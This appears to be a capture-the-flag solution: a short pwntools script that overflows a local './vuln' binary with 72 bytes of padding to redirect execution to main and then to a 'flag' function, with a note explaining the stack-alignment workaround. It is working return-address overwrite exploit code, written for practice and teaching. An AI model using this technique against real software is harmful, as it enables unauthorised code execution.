from pwn import *

p = process("./vuln")
e = ELF("./vuln")
print(p.recvline())
p.sendline("A" * 72 + p64(e.symbols["main"]))
print(p.recvline())
p.sendline("A" * 72 + p64(e.symbols["flag"]))
print(p.recvline())

"""
Using a similar technique as in Overflow 2, we can find the offset necessary to overwrite RBP (72).

However, overflowing directly to flag causes a segfault when printing the flag. Turns out that this is because
of some alignment issue. We can get around this by returning back to main and sending the normal payload as usual.


"""
